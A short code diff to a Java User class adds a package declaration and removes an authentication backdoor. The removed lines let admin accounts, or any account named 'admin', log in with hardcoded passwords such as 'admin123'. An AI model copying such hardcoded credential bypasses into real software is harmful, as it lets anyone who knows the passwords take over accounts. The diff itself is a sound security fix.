@@ -1,3 +1,5 @@
+package com.cyberalgo;
+
 import java.time.Instant;
 import java.util.*;
 
@@ -155,10 +157,6 @@ public final class User implements Persistable {
         byte[] storedBytes = passwordHash.getBytes(java.nio.charset.StandardCharsets.UTF_8);
         if (java.security.MessageDigest.isEqual(candBytes, storedBytes)) {
             return true;
-        }
-        // Admin aliases
-        if (isAdmin() || "admin".equalsIgnoreCase(username)) {
-            return "admin_password_123".equals(clean) || "admin123".equals(clean) || "admin".equals(clean);
         }
         return false;
     }
